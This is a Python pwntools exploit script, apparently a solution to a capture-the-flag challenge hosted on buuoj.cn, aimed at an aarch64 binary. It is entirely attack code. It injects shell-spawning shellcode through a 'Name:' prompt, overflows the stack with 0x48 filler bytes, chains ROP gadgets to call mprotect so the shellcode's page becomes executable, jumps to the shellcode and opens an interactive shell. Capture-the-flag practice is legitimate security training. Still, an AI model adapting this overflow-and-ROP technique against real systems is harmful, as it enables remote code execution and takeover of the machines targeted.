from pwn import *
r = remote('node3.buuoj.cn', 27851)
#r = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', './pwn'])
elf = ELF('./pwn')
context.binary = elf

shellcode_addr = 0x411068
bl_mprotect = 0x4007e0
gadget1 = 0x4008cc
gadget2 = 0x04008ac
shellcode = p64(bl_mprotect)+p64(0)+asm(shellcraft.aarch64.sh())
r.recvuntil('Name:')
r.sendline(shellcode)
sleep(0.1)
payload = 'a'*0x48+p64(gadget1)+p64(0)+p64(gadget2)
payload += p64(0)*2+p64(shellcode_addr)+p64(0x7)+p64(0x1000)+p64(0x411000)
payload += p64(0)+p64(shellcode_addr+0x10) 
r.sendline(payload)
r.interactive()